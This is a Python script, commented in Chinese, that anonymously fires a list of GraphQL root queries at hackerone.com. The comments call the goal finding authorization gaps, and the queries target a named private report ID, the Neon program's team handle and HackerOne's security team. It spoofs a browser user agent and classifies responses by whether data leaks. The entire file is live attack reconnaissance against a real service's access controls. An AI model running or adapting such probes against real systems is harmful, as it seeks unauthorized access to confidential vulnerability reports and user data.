# -*- coding: utf-8 -*-
"""h1x52: 未测根查询匿名批量探测(找权限响应差异,分类:NOT_FOUND/类型错/权限错/数据!)
目标:triage_inbox_items/analytics/gateway_users/assignable_teams/conversation 等直查型"""
import sys, io, json
sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8', errors='replace')
import requests, urllib3
urllib3.disable_warnings()
s = requests.Session()
s.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/126.0.0.0 Safari/537.36'})

def probe(name, query):
    q = 'query { %s }' % query
    try:
        r = s.post('https://hackerone.com/graphql', json={'query': q}, timeout=20)
        t = r.text[:600].replace('\n', ' ')
        print(f'--- {name} [{r.status_code}]')
        print(f'  {t}')
        return t
    except Exception as e:
        print(f'--- {name} ERR {type(e).__name__}: {e}')
        return None

# 直查型候选(3732660 = 目标私有报告;neon_bbp = Neon handle;13 = H1 security team id)
cands = [
    ('triage_inbox_items_rpt', 'triage_inbox_items(report_id: 3732660, first: 5) { edges { node { id } } }'),
    ('triage_inbox_items_team', 'triage_inbox_items(team_handle: "neon_bbp", first: 5) { edges { node { id } } }'),
    ('triage_inbox', 'triage_inbox { id }'),
    ('analytics_reports', 'analytics_reports(first: 5) { edges { node { id } } }'),
    ('analytics_chart_explore', 'analytics_chart_explore(chart_key: "x", team_id: 13, page: 1, page_size: 5) { page }'),
    ('gateway_users_neon', 'gateway_users(team_handle: "neon_bbp", first: 5) { edges { node { id } } }'),
    ('gateway_users_h1', 'gateway_users(team_handle: "security", first: 5) { edges { node { id } } }'),
    ('assignable_teams', 'assignable_teams(report_ids: [3732660], first: 5) { edges { node { id } } }'),
    ('conversation_1', 'conversation(id: 1) { id }'),
    ('webhook_1', 'webhook(id: 1) { id }'),
    ('intake_workflow', 'intake_workflow(report_id: 3732660) { id }'),
    ('derived_pentest', 'derived_pentest(origin_id: 3732660, origin_type: "Report") { id }'),
    ('report_retests', 'report_retests(first: 5) { edges { node { id } } }'),
    ('report_retest_user', 'report_retest_user(activity_id: 1) { id }'),
    ('mediation_requests', 'mediation_requests(first: 5) { edges { node { id } } }'),
    ('opportunities_search', 'opportunities_search(query: "neon", first: 5) { edges { node { id } } }'),
    ('document_q', 'document(queries: ["x"], elements: ["y"]) { id }'),
    ('pentest_report_1', 'pentest_report(id: 1) { id }'),
    ('report_intent_1', 'report_intent(id: 1) { id }'),
    ('machine_learning_inf', 'machine_learning_inference_result(id: 1) { id }'),
    ('hai_chat_1', 'hai_chat(id: 1) { id }'),
    ('hai_task_1', 'hai_task(id: 1) { id }'),
    ('conversation_3732660', 'conversation(id: 3732660) { id }'),
]
for name, q in cands:
    probe(name, q)
